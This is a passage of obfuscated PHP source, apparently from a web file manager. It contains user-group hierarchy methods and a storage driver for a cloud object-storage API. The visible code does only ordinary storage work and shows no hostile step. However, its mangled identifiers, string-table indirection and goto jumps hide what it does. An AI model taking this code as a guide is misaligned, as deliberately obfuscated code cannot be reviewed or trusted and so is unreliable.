_listAppendChildren(&$½°ßœã) { $®¶³ç”ã =& $_SERVER[íïàËŸë]; $óöÑ¯ñç = array_to_keyvalue($½°ßœã, $®¶³ç”ã[12], $®¶³ç”ã[1980]); $°Ÿ˜µ…˜ = array($®¶³ç”ã[192] => array($®¶³ç”ã[7], $óöÑ¯ñç)); $Á˜À¸õù = array($®¶³ç”ã[192], $®¶³ç”ã[2084] => $®¶³ç”ã[565]); $ÎŞ°äÉİ = $this->field($Á˜À¸õù)->where($°Ÿ˜µ…˜)->group($®¶³ç”ã[192])->select(); $Ùœ€ó£¯ = array_to_keyvalue($ÎŞ°äÉİ, $®¶³ç”ã[192], $®¶³ç”ã[565]); foreach ($½°ßœã as &$ëİğªŞ) { $ï–¯ç·Ì = $ëİğªŞ[$®¶³ç”ã[1980]]; $ëİğªŞ[$®¶³ç”ã[2085]] = isset($Ùœ€ó£¯[$ï–¯ç·Ì]) ? intval($Ùœ€ó£¯[$ï–¯ç·Ì]) : !1; } unset($ëİğªŞ); } private function _listAppendChildrenMember(&$¨ÃˆˆÊù) { $©á ã°‘ =& $_SERVER[íïàËŸë]; $öÜÛ® = array_to_keyvalue($¨ÃˆˆÊù, $©á ã°‘[12], $©á ã°‘[1980]); $„ôÃªÎº = array($©á ã°‘[1980] => array($©á ã°‘[7], $öÜÛ®)); $õ¯ÚÌñ = array($©á ã°‘[1980], $©á ã°‘[2084] => $©á ã°‘[565]); $Š§œ«³ù = Model($©á ã°‘[2074])->field($õ¯ÚÌñ)->where($„ôÃªÎº)->group($©á ã°‘[1980])->select(); $ú¬Ï¨™° = array_to_keyvalue($Š§œ«³ù, $©á ã°‘[1980], $©á ã°‘[565]); foreach ($¨ÃˆˆÊù as &$©¼èõÊ) { $Ø¬ßñûÈ = $©¼èõÊ[$©á ã°‘[1980]]; $©¼èõÊ[$©á ã°‘[2086]] = isset($ú¬Ï¨™°[$Ø¬ßñûÈ]) ? intval($ú¬Ï¨™°[$Ø¬ßñûÈ]) : !1; } unset($©¼èõÊ); } private function _listAppendMeta(&$Œ¯Ù’, $‘¤Ìï–¸) { $Èıª¦³• =& $_SERVER[íïàËŸë]; $§ò†´ü = array($Èıª¦³•[1980] => array($Èıª¦³•[7], $‘¤Ìï–¸)); $€Â˜ëí½ = Model($Èıª¦³•[2073])->where($§ò†´ü)->select(); $€Â˜ëí½ = array_to_keyvalue_group($€Â˜ëí½, $Èıª¦³•[1980]); foreach ($€Â˜ëí½ as &$Ÿ–ÂâÊÕ) { $Ÿ–ÂâÊÕ = array_to_keyvalue($Ÿ–ÂâÊÕ, $Èıª¦³•[97], $Èıª¦³•[450]); } unset($Ÿ–ÂâÊÕ); foreach ($Œ¯Ù’ as &$Šáõ™‡¹) { $Šáõ™‡¹[$Èıª¦³•[539]] = array(); if (isset($€Â˜ëí½[$Šáõ™‡¹[$Èıª¦³•[1980]]])) { $Šáõ™‡¹[$Èıª¦³•[539]] = $€Â˜ëí½[$Šáõ™‡¹[$Èıª¦³•[1980]]]; } } unset($Šáõ™‡¹); } protected function parentLevelArray($Ê‡øÕõ) { $›ÍîìŸŞ =& $_SERVER[íïàËŸë]; $Ê‡øÕõ = explode($›ÍîìŸŞ[50], trim($Ê‡øÕõ, $›ÍîìŸŞ[50])); $Ê‡øÕõ = array_remove_value($Ê‡øÕõ, $›ÍîìŸŞ[228]); return $Ê‡øÕõ; } protected function parentInGroup($™›èÜïî, $®¡—‹“) { $İ¥›–àŸ =& $_SERVER[íïàËŸë]; $ŞèÒü¹í = $this->getInfoSimple($™›èÜïî); if (!$ŞèÒü¹í) { return !0; } $®‹‹½ñ = $this->parentLevelArray($ŞèÒü¹í[$İ¥›–àŸ[584]]); $®‹‹½ñ[] = $™›èÜïî; foreach ($®‹‹½ñ as $™›èÜïî) { if (in_array($™›èÜïî . $İ¥›–àŸ[12], $®¡—‹“)) { return !0; } } return !1; } private function _listAppendParent(&$Äõü¤¾Ê) { $›ç¶úÜä =& $_SERVER[íïàËŸë]; $Ë¿†ÈŞ = array(); foreach ($Äõü¤¾Ê as &$¿˜¬¼çŸ) { $Ë¿†ÈŞ[$¿˜¬¼çŸ[$›ç¶úÜä[1980]]] = $¿˜¬¼çŸ[$›ç¶úÜä[32]]; $¯ÔŒË¦ƒ = $this->parentLevelArray($¿˜¬¼çŸ[$›ç¶úÜä[584]]); foreach ($¯ÔŒË¦ƒ as $×ºÖ‘ƒ) { if (!isset($Ë¿†ÈŞ[$×ºÖ‘ƒ])) { $Ë¿†ÈŞ[$×ºÖ‘ƒ] = 0; } } } unset($¿˜¬¼çŸ); foreach ($Ë¿†ÈŞ as $Š€§Á => $Çñ°Şä) { if ($Çñ°Şä) { continue; } $îİìÕ‘ª = $this->getInfoSimple($Š€§Á); $Ë¿†ÈŞ[$Š€§Á] = $îİìÕ‘ª[$›ç¶úÜä[32]]; } $äÛâÔ‰Õ = $GLOBALS[$›ç¶úÜä[6]][$›ç¶úÜä[92]][$›ç¶úÜä[2087]]; if (KodUser::isRoot()) { $äÛâÔ‰Õ = !1; } foreach ($Äõü¤¾Ê as &$¿˜¬¼çŸ) { $¯ÔŒË¦ƒ = $this->parentLevelArray($¿˜¬¼çŸ[$›ç¶úÜä[584]]); $É©şÁİ = $›ç¶úÜä[12]; foreach ($¯ÔŒË¦ƒ as $Š€§Á => $×ºÖ‘ƒ) { if ($äÛâÔ‰Õ && $Š€§Á == 0) { continue; } $É©şÁİ .= $Ë¿†ÈŞ[$×ºÖ‘ƒ] . $›ç¶úÜä[8]; } if ($¯ÔŒË¦ƒ) { $É©şÁİ .= $¿˜¬¼çŸ[$›ç¶úÜä[32]]; } $¿˜¬¼çŸ[$›ç¶úÜä[589]] = str_replace($›ç¶úÜä[592], $›ç¶úÜä[8], $É©şÁİ); } unset($¿˜¬¼çŸ); } private function _listAppendSourceRoot(&$©“ú¯²ü, $ã¨òŒº) { $‹şÍÜƒ¥ =& $_SERVER[íïàËŸë]; $ÃşÎñ = Model($‹şÍÜƒ¥[907])->listSourceRoot(SourceModel::TYPE_GROUP, $ã¨òŒº); $ÃşÎñ = array_to_keyvalue($ÃşÎñ, $‹şÍÜƒ¥[569]); $ÃşÎñ = array_remove_key($ÃşÎñ, $‹şÍÜƒ¥[569]); foreach ($©“ú¯²ü as &$×çÚ¥±­) { $×çÚ¥±­[$‹şÍÜƒ¥[90]] = $ÃşÎñ[$×çÚ¥±­[$‹şÍÜƒ¥[1980]]] ? $ÃşÎñ[$×çÚ¥±­[$‹şÍÜƒ¥[1980]]] : array(); } unset($×çÚ¥±­); } protected function groupMerge($¤æ¥ö‹–) { $¤æ¥ö‹– = array_values(array_unique($¤æ¥ö‹–)); $¿¦ğÕ™û = array(); for ($Òì®üâ = 0; $Òì®üâ < count($¤æ¥ö‹–); $Òì®üâ++) { $ş­®‹¹… = !1; for ($´±¯‡› = 0; $´±¯‡› < count($¤æ¥ö‹–); $´±¯‡›++) { if ($Òì®üâ == $´±¯‡›) { continue; } if ($this->isParentOf($¤æ¥ö‹–[$´±¯‡›], $¤æ¥ö‹–[$Òì®üâ])) { $ş­®‹¹… = !0; break; } } if (!$ş­®‹¹…) { $¿¦ğÕ™û[] = $¤æ¥ö‹–[$Òì®üâ]; } } return $¿¦ğÕ™û; } protected function isParentOf($¸ºñ”›, $á–ŞÁƒ) { $ÅÕÕğê =& $_SERVER[íïàËŸë]; if (!$¸ºñ”› || !$á–ŞÁƒ || $¸ºñ”› == $á–ŞÁƒ) { return !1; } $ÍŞ‹€½ = $this->getInfoSimple($¸ºñ”›); $ôºĞ = $this->getInfoSimple($á–ŞÁƒ); $ÔŞçÄ´Ï = $ÍŞ‹€½[$ÅÕÕğê[584]] . $¸ºñ”› . $ÅÕÕğê[50]; if (substr($ôºĞ[$ÅÕÕğê[584]], 0, strlen($ÔŞçÄ´Ï)) == $ÔŞçÄ´Ï) { return !0; } return !1; } public function groupShowRoot($”‡£¡Æ, $ÚüÒØÈ™ = false) { $å†Êó¹Ğ =& $_SERVER[íïàËŸë]; $¡½ô™²ç = $this->getInfo($”‡£¡Æ); if (!$¡½ô™²ç) { return array(); } $ÀîæÜÃ• = $this->parentLevelArray($¡½ô™²ç[$å†Êó¹Ğ[584]]); $¢Øõô‰ = array($”‡£¡Æ); if (count($ÀîæÜÃ•) == 0) { return $¢Øõô‰; } if ($ÚüÒØÈ™ && count($ÀîæÜÃ•) == 1) { return $¢Øõô‰; } if (!$¡½ô™²ç[$å†Êó¹Ğ[539]] || !isset($¡½ô™²ç[$å†Êó¹Ğ[539]][$å†Êó¹Ğ[2070]]) || $¡½ô™²ç[$å†Êó¹Ğ[539]][$å†Êó¹Ğ[2070]] == $å†Êó¹Ğ[859]) { return $this->groupShowRoot($ÀîæÜÃ•[count($ÀîæÜÃ•) - 1], $ÚüÒØÈ™); } if ($¡½ô™²ç[$å†Êó¹Ğ[539]][$å†Êó¹Ğ[2070]] == $å†Êó¹Ğ[433]) { $Ÿ¯óœÆ = explode($å†Êó¹Ğ[50], $¡½ô™²ç[$å†Êó¹Ğ[539]][$å†Êó¹Ğ[2071]]); if ($Ÿ¯óœÆ) { $¢Øõô‰ = array_merge($¢Øõô‰, $Ÿ¯óœÆ); } } return $¢Øõô‰; } protected function resetParentLevel() { $ª–ÎÀÎ =& $_SERVER[íïàËŸë]; $Ôó»×ôÖ = $ª–ÎÀÎ[1980]; $—µ«ù„ş = $this->select(); $—µ«ù„ş = array_to_keyvalue($—µ«ù„ş, $Ôó»×ôÖ); foreach ($—µ«ù„ş as $»ÕŒıÇá) { $¶ŞŒÚò = $»ÕŒıÇá; $–úŞ²­ò = array(); while ($¶ŞŒÚò[$ª–ÎÀÎ[192]] != 0) { $–úŞ²­ò[] = $¶ŞŒÚò[$ª–ÎÀÎ[192]]; $¶ŞŒÚò = $—µ«ù„ş[$¶ŞŒÚò[$ª–ÎÀÎ[192]]]; } $–úŞ²­ò[] = 0; $–úŞ²­ò = $ª–ÎÀÎ[50] . implode($ª–ÎÀÎ[50], array_reverse($–úŞ²­ò)) . $ª–ÎÀÎ[50]; $this->setNamePinyin($»ÕŒıÇá[$Ôó»×ôÖ], $»ÕŒıÇá[$ª–ÎÀÎ[32]]); $this->where(array($Ôó»×ôÖ => $»ÕŒıÇá[$Ôó»×ôÖ]))->save(array($ª–ÎÀÎ[652] => $–úŞ²­ò)); } return $—µ«ù„ş; } public function groupNameAuto($êËÊ˜êª, $ ÊË) { $•İü©Ï· =& $_SERVER[íïàËŸë]; $õ·ãİ³× = $this->where(array($•İü©Ï·[477] => $êËÊ˜êª))->getField($•İü©Ï·[32], !0); if (!$õ·ãİ³× || !in_array($ ÊË, $õ·ãİ³×)) { return $ ÊË; } for ($‰¯„ö¿ô = 1; $‰¯„ö¿ô <= count($õ·ãİ³×) + 1; $‰¯„ö¿ô++) { $–Î¥È¦ = $ ÊË . "\50{$‰¯„ö¿ô}\51"; if (!in_array($–Î¥È¦, $õ·ãİ³×)) { return $–Î¥È¦; } } } public function groupSwitch($Ãæ„•óÔ, $áæÒñÒş) { $õ¡ó©  =& $_SERVER[íïàËŸë]; $¿à‰şú“ = array($õ¡ó© [1980] => array($õ¡ó© [7], array($Ãæ„•óÔ, $áæÒñÒş))); $™Õ§õ› = $this->where($¿à‰şú“)->select(); $™Õ§õ› = array_to_keyvalue($™Õ§õ›, $õ¡ó© [1980]); if (!isset($™Õ§õ›[$Ãæ„•óÔ]) || !isset($™Õ§õ›[$áæÒñÒş]) || $™Õ§õ›[$Ãæ„•óÔ][$õ¡ó© [192]] == 0) { return !1; } $¿à‰şú“ = array($õ¡ó© [1980] => $Ãæ„•óÔ); $ Äè¶Ç” = Model($õ¡ó© [2074])->where($¿à‰şú“)->select(); if (!$ Äè¶Ç”) { $ Äè¶Ç” = array(); } foreach ($ Äè¶Ç” as $‹ø†—Ší) { $­ö°íªù = $‹ø†—Ší[$õ¡ó© [1782]]; $¿à‰şú“ = array($õ¡ó© [1782] => $­ö°íªù, $õ¡ó© [1980] => $áæÒñÒş); $¸Ô—àäÌ = Model($õ¡ó© [2074])->where($¿à‰şú“)->find(); if (!$¸Ô—àäÌ) { $è›ÜûË¾ = array($áæÒñÒş => $‹ø†—Ší[$õ¡ó© [2088]]); Model($õ¡ó© [598])->userGroupAdd($­ö°íªù, $è›ÜûË¾); } Model($õ¡ó© [598])->userGroupRemove($­ö°íªù, $Ãæ„•óÔ); } $¿à‰şú“ = array($õ¡ó© [190] => 2, $õ¡ó© [192] => 0, $õ¡ó© [485] => 1, $õ¡ó© [569] => array($õ¡ó© [7], array($Ãæ„•óÔ, $áæÒñÒş))); $Åİ·£›Ì = Model($õ¡ó© [907])->where($¿à‰şú“)->field($õ¡ó© [2089])->select(); $Åİ·£›Ì = array_to_keyvalue($Åİ·£›Ì, $õ¡ó© [569], $õ¡ó© [193]); $£É½¿Õ¸ = !empty($Åİ·£›Ì[$Ãæ„•óÔ]) ? $Åİ·£›Ì[$Ãæ„•óÔ] : !1; if ($£É½¿Õ¸) { if (!$Åİ·£›Ì[$áæÒñÒş]) { $Åİ·£›Ì[$áæÒñÒş] = Model($õ¡ó© [907])->groupRootAdd($áæÒñÒş); } $ÙÏ–Ö‡Š = $Åİ·£›Ì[$áæÒñÒş]; $¿à‰şú“ = array($õ¡ó© [192] => $£É½¿Õ¸); $Åİ·£›Ì = Model($õ¡ó© [907])->where($¿à‰şú“)->field($õ¡ó© [2090])->select(); if (!$Åİ·£›Ì) { $Åİ·£›Ì = array(); } Model($õ¡ó© [907])->moveClearAuth = !1; foreach ($Åİ·£›Ì as $ŞÊÁ‹Å‡) { $—šò¥¸€ = $ŞÊÁ‹Å‡[$õ¡ó© [485]] == $õ¡ó© [91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($õ¡ó© [907])->move($ŞÊÁ‹Å‡[$õ¡ó© [193]], $ÙÏ–Ö‡Š, $—šò¥¸€); } Model($õ¡ó© [907])->moveClearAuth = !0; $¿à‰şú“ = array($õ¡ó© [190] => 2, $õ¡ó© [569] => $Ãæ„•óÔ); $ŒöĞú’õ = array($õ¡ó© [569] => $áæÒñÒş); Model($õ¡ó© [2091])->where($¿à‰şú“)->save($ŒöĞú’õ); Model($õ¡ó© [2092])->where($¿à‰şú“)->save($ŒöĞú’õ); } $this->_changeChildLevel($™Õ§õ›[$Ãæ„•óÔ], $™Õ§õ›[$áæÒñÒş], !0); $this->where(array($õ¡ó© [192] => $Ãæ„•óÔ))->save(array($õ¡ó© [192] => $áæÒñÒş)); $this->_clearChildrenCache($™Õ§õ›[$áæÒñÒş]); return !0; } } goto fÄŸŠ»¯½; aÄÚÁùÍÍÀ: class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\x70\72\x2f\x2f\x76\x30\x2e\x61\160\151\56\x75\160\x79\165\x6e\56\x63\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($©’¸İÅ¥) { parent::__construct(); $this->_init($©’¸İÅ¥); } public function _init($ÃŸİÂä¡) { $•öôÜÔò =& $_SERVER[íïàËŸë]; foreach ($ÃŸİÂä¡ as $´ãùÜôò => $çşÆ¼ı®) { if (isset($this->{$´ãùÜôò})) { $this->{$´ãùÜôò} = $çşÆ¼ı®; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($•öôÜÔò[1554] . LNG($•öôÜÔò[1473])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($˜ó¾ìÀç, $Æúó•²â = "\107\x45\124") { $íÅÓÜ¦” =& $_SERVER[íïàËŸë]; $âÍàÕÖ« = gmdate($íÅÓÜ¦”[1502]); $ÕÊÅÕŞ© = base64_encode(hash_hmac($íÅÓÜ¦”[1555], "{$Æúó•²â}\46{$˜ó¾ìÀç}\46{$âÍàÕÖ«}", md5("{$this->userpass}"), !0)); $ÌªŠÀâ» = array("\x41\x75\164\150\x6f\x72\151\x7a\141\164\151\x6f\156\x3a\125\120\x59\125\116\40{$this->username}\x3a{$ÕÊÅÕŞ©}", "\x44\x61\164\145\72{$âÍàÕÖ«}"); return $ÌªŠÀâ»; } public function ussRequest($ûıìÊ™™, $ë«é„” = "\107\105\x54", $¦Ä›¸„Ÿ = false, $¢’£Ìü£ = false, $°‘‡»Ö = false) { $¾Ê¼ìş„ =& $_SERVER[íïàËŸë]; $ûıìÊ™™ = trim($ûıìÊ™™, $¾Ê¼ìş„[8]); $Ë‡¤äÉ = "\57{$this->bucket}\57{$ûıìÊ™™}"; $á²‡İÚè = $this->ussHeaders($Ë‡¤äÉ, $ë«é„”); if ($¢’£Ìü£) { $á²‡İÚè = array_merge($á²‡İÚè, $¢’£Ìü£); } $ÇÆÇÔı = url_request($this->endpoint . $Ë‡¤äÉ, $ë«é„”, $¦Ä›¸„Ÿ, $á²‡İÚè, $°‘‡»Ö); if (!$ÇÆÇÔı) { $‡Ëª›ŠÒ = LNG($¾Ê¼ìş„[1556]); $this->writeLog($‡Ëª›ŠÒ); return array($¾Ê¼ìş„[1308] => !1, $¾Ê¼ìş„[1298] => $‡Ëª›ŠÒ); } if (strtolower($ë«é„”) == $¾Ê¼ìş„[227] || in_array($ÇÆÇÔı[$¾Ê¼ìş„[1308]], array($¾Ê¼ìş„[274], $¾Ê¼ìş„[1557]))) { $¦Ä›¸„Ÿ = $ÇÆÇÔı[$¾Ê¼ìş„[1558]]; } else { $¦Ä›¸„Ÿ = json_decode($ÇÆÇÔı[$¾Ê¼ìş„[1298]], !0); if (!$¦Ä›¸„Ÿ) { $¦Ä›¸„Ÿ = $ÇÆÇÔı[$¾Ê¼ìş„[1298]]; } else { if (!$ÇÆÇÔı[$¾Ê¼ìş„[833]] && isset($¦Ä›¸„Ÿ[$¾Ê¼ìş„[1559]])) { $¦Ä›¸„Ÿ = $¦Ä›¸„Ÿ[$¾Ê¼ìş„[1559]]; } } } if (!$ÇÆÇÔı[$¾Ê¼ìş„[833]]) { $this->writeLog($this->__errorMessage($¦Ä›¸„Ÿ)); } return array($¾Ê¼ìş„[1308] => $ÇÆÇÔı[$¾Ê¼ìş„[833]], $¾Ê¼ìş„[1298] => $¦Ä›¸„Ÿ); } private function __errorMessage($÷Ô÷Ìï) { $±¦İ…ÆÎ =& $_SERVER[íïàËŸë]; if (!$÷Ô÷Ìï) { return $±¦İ…ÆÎ[12]; } static $áĞİå·› = null; if (!$áĞİå·›) { $áĞİå·› = I18n::getType(); } if ($áĞİå·› != $±¦İ…ÆÎ[1512]) { return $÷Ô÷Ìï; } $×ƒ†½‚½ = array($±¦İ…ÆÎ[1560] => $±¦İ…ÆÎ[1561], $±¦İ…ÆÎ[1562] => $±¦İ…ÆÎ[1563], $±¦İ…ÆÎ[1564] => $±¦İ…ÆÎ[1563], $±¦İ…ÆÎ[1565] => $±¦İ…ÆÎ[1566], $±¦İ…ÆÎ[1567] => $±¦İ…ÆÎ[1568], $±¦İ…ÆÎ[1569] => $±¦İ…ÆÎ[1570], $±¦İ…ÆÎ[1571] => $±¦İ…ÆÎ[1572]); return isset($×ƒ†½‚½[$÷Ô÷Ìï]) ? $×ƒ†½‚½[$÷Ô÷Ìï] : $÷Ô÷Ìï; } public function mkfile($ë×™Ü‡ß, $‘‰¤ôøµ = '', $¢Å´éŞÌ = REPEAT_RENAME) { if ($this->setContent($ë×™Ü‡ß, $‘‰¤ôøµ)) { return $this->getPathOuter($ë×™Ü‡ß); } return !1; } public function mkdir($ªã•…Ñ¬, $íş‡¨­Ã = REPEAT_SKIP) { $å›×÷ß =& $_SERVER[íïàËŸë]; $©Èéß‚ = trim($ªã•…Ñ¬, $å›×÷ß[8]); if ($this->_isFolder($©Èéß‚)) { return $this->getPathOuter($©Èéß‚); } $·«µİÉª = array($å›×÷ß[1573]); $¬Çìİ’Ç = $this->ussRequest($©Èéß‚, $å›×÷ß[257], !1, $·«µİÉª); return $¬Çìİ’Ç[$å›×÷ß[1308]] ? $this->getPathOuter($©Èéß‚) : !1; } public function copyFile($ •ŸÉîÈ, $Ÿ³ÛöùÅ) { $¬ÎŠÄĞò =& $_SERVER[íïàËŸë]; $½—ğ±Â‹ = array($¬ÎŠÄĞò[1574] . "\x2f{$this->bucket}\x2f{$ •ŸÉîÈ}", $¬ÎŠÄĞò[1575]); $Ü—€‰É = $this->ussRequest($Ÿ³ÛöùÅ, $¬ÎŠÄĞò[259], !1, $½—ğ±Â‹); return $Ü—€‰É[$¬ÎŠÄĞò[1308]] ? !0 : $this->getPathOuter($Ÿ³ÛöùÅ); } public function moveFile($¡ÎÂòù¼, $·‰î») { $îá­Ïõ» =& $_SERVER[íïàËŸë]; $íÊ»´— = array($îá­Ïõ»[1576] . "\57{$this->bucket}\57{$¡ÎÂòù¼}", $îá­Ïõ»[1575]); $ú££ÊÌÃ = $this->ussRequest($·‰î», $îá­Ïõ»[259], !1, $íÊ»´—); return $ú££ÊÌÃ[$îá­Ïõ»[1308]] ? !0 : $this->getPathOuter($·‰î»); } public function delFile($ˆ‚·»ìÑ) { $€Ë¹Çƒ =& $_SERVER[íïàËŸë]; $–ƒ§­— = $this->ussRequest($ˆ‚·»ìÑ, $€Ë¹Çƒ[1577]); return $–ƒ§­—[$€Ë¹Çƒ[1308]] ? !0 : !1; } public function delFolder($ëìë¨â›) { $ìÏ§ïº =& $_SERVER[íïàËŸë]; if (!$this->exist($ëìë¨â›)) { return !0; } $this->listItemCache = !1; $¬¥ÓØìÉ = $ßâ‚Âæ‰ = array(); $this->fileList($ëìë¨â›, $¬¥ÓØìÉ, $ßâ‚Âæ‰, !0); $this->listItemCache = !0; foreach ($ßâ‚Âæ‰ as $¢ÚãªØ) { $æìÀ•È€ = $this->ussRequest($¢ÚãªØ[$ìÏ§ïº[32]], $ìÏ§ïº[1577]); if (!$æìÀ•È€[$ìÏ§ïº[1308]]) { return !1; } } foreach ($¬¥ÓØìÉ as $ÌŞÎÛñ) { $æìÀ•È€ = $this->ussRequest($ÌŞÎÛñ, $ìÏ§ïº[1577]); if (!$æìÀ•È€[$ìÏ§ïº[1308]]) { return !1; } } $æìÀ•È€ = $this->ussRequest($ëìë¨â›, $ìÏ§ïº[1577]); return $æìÀ•È€[$ìÏ§ïº[1308]]; } public function rename($ãôÚ¦´¼, $š”åÆ) { if ($this->isFile($ãôÚ¦´¼)) { $š”åÆ = get_path_father($ãôÚ¦´¼) . $š”åÆ; return $this->moveFile($ãôÚ¦´¼, $š”åÆ); } return $this->renameObject($ãôÚ¦´¼, $š”åÆ); } public function fileInfo($¤âÑîî, $¨®’ÎôÔ = false, $Şı°ôş = array()) { $Ì£•ì®ˆ =& $_SERVER[íïàËŸë]; $°¯¢›…ğ = array($Ì£•ì®ˆ[32] => $this->pathThis($¤âÑîî), $Ì£•ì®ˆ[87] => $this->getPathOuter($Ì£•ì®ˆ[8] . $¤âÑîî), $Ì£•ì®ˆ[33] => $Ì£•ì®ˆ[230], $Ì£•ì®ˆ[79] => isset($Şı°ôş[$Ì£•ì®ˆ[79]]) ? $Şı°ôş[$Ì£•ì®ˆ[79]] : 0, $Ì£•ì®ˆ[169] => $this->ext($¤âÑîî)); if ($¨®’ÎôÔ) { return $°¯¢›…ğ; } $°¯¢›…ğ[$Ì£•ì®ˆ[231]] = $°¯¢›…ğ[$Ì£•ì®ˆ[88]] = 0; $°¯¢›…ğ[$Ì£•ì®ˆ[232]] = $°¯¢›…ğ[$Ì£•ì®ˆ[233]] = !0; if (empty($Şı°ôş)) { $Şı°ôş = $this->objectMeta($¤âÑîî); if (!$Şı°ôş) { return $°¯¢›…ğ; } } $°¯¢›…ğ[$Ì£•ì®ˆ[231]] = intval($Şı°ôş[$Ì£•ì®ˆ[1578]]); $°¯¢›…ğ[$Ì£•ì®ˆ[88]] = intval($Şı°ôş[$Ì£•ì®ˆ[1579]]); $°¯¢›…ğ[$Ì£•ì®ˆ[79]] = $Şı°ôş[$Ì£•ì®ˆ[79]]; return $°¯¢›…ğ; } public function folderInfo($À‡•İÑ, $Ğº´Î×Ğ = false) { $ÇÏÀÈş =& $_SERVER[íïàËŸë]; $á¹ë» = array($ÇÏÀÈş[32] => $this->pathThis($À‡•İÑ), $ÇÏÀÈş[87] => $this->getPathOuter($ÇÏÀÈş[8] . $À‡•İÑ), $ÇÏÀÈş[33] => $ÇÏÀÈş[78]); if ($Ğº´Î×Ğ) { return $á¹ë»; } $á¹ë»[$ÇÏÀÈş[231]] = $á¹ë»[$ÇÏÀÈş[88]] = 0; $á¹ë»[$ÇÏÀÈş[232]] = $á¹ë»[$ÇÏÀÈş[233]] = !0; if (empty($×µ„­À´)) { $×µ„­À´ = $this->objectMeta($À‡•İÑ); if (!$×µ„­À´) { return $á¹ë»; } } $á¹ë»[$ÇÏÀÈş[231]] = intval($×µ„­À´[$ÇÏÀÈş[1578]]); $á¹ë»[$ÇÏÀÈş[88]] = intval($×µ„­À´[$ÇÏÀÈş[1579]]); return $á¹ë»; } private function listObjs($ò‰€ßƒº, $·¡®Ù€Ó = 0, $™¯»ÊäÎ = 1000) { $ß¬ñ½®™ =& $_SERVER[íïàËŸë]; $£ÊÃóÜÄ = array($ß¬ñ½®™[1580], $ß¬ñ½®™[1581] . $™¯»ÊäÎ); if ($·¡®Ù€Ó) { $£ÊÃóÜÄ[] = $ß¬ñ½®™[1582] . $·¡®Ù€Ó; } $îªÒÛğ³ = $this->ussRequest($ò‰€ßƒº, $ß¬ñ½®™[261], !1, $£ÊÃóÜÄ); return !$îªÒÛğ³[$ß¬ñ½®™[1308]] ? !1 : $îªÒÛğ³[$ß¬ñ½®™[1298]]; } private function fileList($Î¨Î§ï, &$âíò°íĞ, &$»„šë ÷, $Ì›”àŠà = false) { $Š‚´·ªß =& $_SERVER[íïàËŸë]; $¿™“ğğ… = $Š‚´·ªß[12]; $„—Õ§©“ = 1000; $£¤çÊ– = rtrim($Î¨Î§ï, $Š‚´·ªß[8]) . $Š‚´·ªß[8]; while (!0) { check_abort(); $ø›¹¨ = $this->listObjs($Î¨Î§ï, $¿™“ğğ…, $„—Õ§©“); if (!$ø›¹¨) { return !1; } $¿™“ğğ… = isset($ø›¹¨[$Š‚´·ªß[1583]]) ? $ø›¹¨[$Š‚´·ªß[1583]] : $Š‚´·ªß[12]; $Í÷Ñ«Ñ‡ = isset($ø›¹¨[$Š‚´·ªß[1584]]) ? $ø›¹¨[$Š‚´·ªß[1584]] : array(); foreach ($Í÷Ñ«Ñ‡ as $ÕÕºïƒ) { $é¯ïÉ‘À = $ÕÕºïƒ[$Š‚´·ªß[33]] == $Š‚´·ªß[78] ? !0 : !1; $µö¦ Àº = ltrim($£¤çÊ– . $ÕÕºïƒ[$Š‚´·ªß[32]], $Š‚´·ªß[8]) . ($é¯ïÉ‘À ? $Š‚´·ªß[8] : $Š‚´·ªß[12]); $÷ù¹úŠ = array($Š‚´·ªß[32] => $µö¦ Àº, $Š‚´·ªß[33] => $é¯ïÉ‘À ? $Š‚´·ªß[78] : $Š‚´·ªß[230], $Š‚´·ªß[79] => $ÕÕºïƒ[$Š‚´·ªß[413]], $Š‚´·ªß[1579] => $ÕÕºïƒ[$Š‚´·ªß[1585]]); $this->cacheMethodInfoSet($µö¦ Àº, $é¯ïÉ‘À, $÷ù¹úŠ); if ($é¯ïÉ‘À) { $âíò°íĞ[] = $µö¦ Àº; if ($Ì›”àŠà) { $this->fileList($µö¦ Àº, $âíò°íĞ, $»„šë ÷, $Ì›”àŠà); } continue; } $»„šë ÷[] = $÷ù¹úŠ; } if (count($Í÷Ñ«Ñ‡) < $„—Õ§©“) { break; } } $this->cacheMethodInfoSet($Î¨Î§ï, !0); } public function listPath($§ÓÑšä–, $àÖ¬äÉ = false) { $é×‚›ÉÚ =& $_SERVER[íïàËŸë]; $å´‘¾¯¨ = $İøÊ”½ˆ = array(); $this->fileList($§ÓÑšä–, $å´‘¾¯¨, $İøÊ”½ˆ); foreach ($å´‘¾¯¨ as $Êü™î‘ø => $¡áÄ¼‚´) { $å´‘¾¯¨[$Êü™î‘ø] = $this->folderInfo($¡áÄ¼‚´, $àÖ¬äÉ); } foreach ($İøÊ”½ˆ as $Êü™î‘ø => $¡áÄ¼‚´) { $İøÊ”½ˆ[$Êü™î‘ø] = $this->fileInfo($¡áÄ¼‚´[$é×‚›ÉÚ[32]], $àÖ¬äÉ, $¡áÄ¼‚´); } return array($é×‚›ÉÚ[85] => $å´‘¾¯¨, $é×‚›ÉÚ[86] => $İøÊ”½ˆ); } public function has($•œ¤¸–‹, $¹õğ£Ü¿ = false, $ƒÙŒë­Ÿ = true) { $úÖ•Ä™ã =& $_SERVER[íïàËŸë]; $ºÓŸš†Ã = $úÖ•Ä™ã[12]; $ë¯ÃÈÜ = 500; $ÙÅúø†Ò = 0; $œÆæ¦ï‡ = 0; $àŸö’öœ = rtrim($•œ¤¸–‹, $úÖ•Ä™ã[8]) . $úÖ•Ä™ã[8]; while (!0) { check_abort(); $ÍÉ»ôñÒ = $this->listObjs($•œ¤¸–‹, $ºÓŸš†Ã, $ë¯ÃÈÜ); if (!$ÍÉ»ôñÒ) { return !1; } $ºÓŸš†Ã = isset($ÍÉ»ôñÒ[$úÖ•Ä™ã[1583]]) ? $ÍÉ»ôñÒ[$úÖ•Ä™ã[1583]] : $úÖ•Ä™ã[12]; $ë¤¨É­¬ = isset($ÍÉ»ôñÒ[$úÖ•Ä™ã[1584]]) ? $ÍÉ»ôñÒ[$úÖ•Ä™ã[1584]] : array(); if (empty($ë¤¨É­¬)) { break; } $ìˆ±¾‰Í = array_filter($ë¤¨É­¬, function ($ ˜é‚‘ğ) { $¤³“…ï =& 